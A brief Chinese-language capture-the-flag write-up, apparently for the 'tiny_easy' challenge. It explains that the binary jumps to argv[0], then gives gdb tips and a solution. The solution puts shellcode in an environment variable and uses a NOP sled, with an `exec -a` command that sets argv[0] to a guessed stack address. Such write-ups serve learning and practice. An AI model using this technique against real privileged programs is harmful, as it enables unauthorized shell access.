剛執行程式就 segmentation fault ( 滿滿的黑人問號 ) <br>
gdb 後發現，這支程式會將 argv[0] 塞到 edx 然後 call 它 <br>

```
小技巧
  gdb ./tiny_easy
  b *0
  r
  b *$eip
  del 1
  r
```

因此，解題思路就清楚了，就是要想辦法讓 argv[0] 等於 shell code 的位址<br>
但 <br>
問題一 <br>
沒有 IO 怎麼寫 shell code ? <br>
答: 寫到環境變數 <br>

問題二<br>
怎麼知道 shell code 位址 <br>
答: 利用 nop-sled <br>


總結: <br>
1. 先到 /tmp 執行 env.sh 將 shell code 寫到環境變數
2. 再執行 exec -a $(python -c 'print "\x96\x2d\x86\xff"')  /home/tiny_easy/tiny_easy & (可能要執行很多次)

note:
1. 執行 shell script 時請用 source , bash 不行 ( 原因請看鳥哥 )
2. \x96\x2d\x86\xff 是隨便找的 ( 用 gdb )，沒有一定
3. exec 要記得放到背景執行, 否則 /bin/bash 會被關閉
4. 成功機率大概 5~10 % 吧 (機率問題)
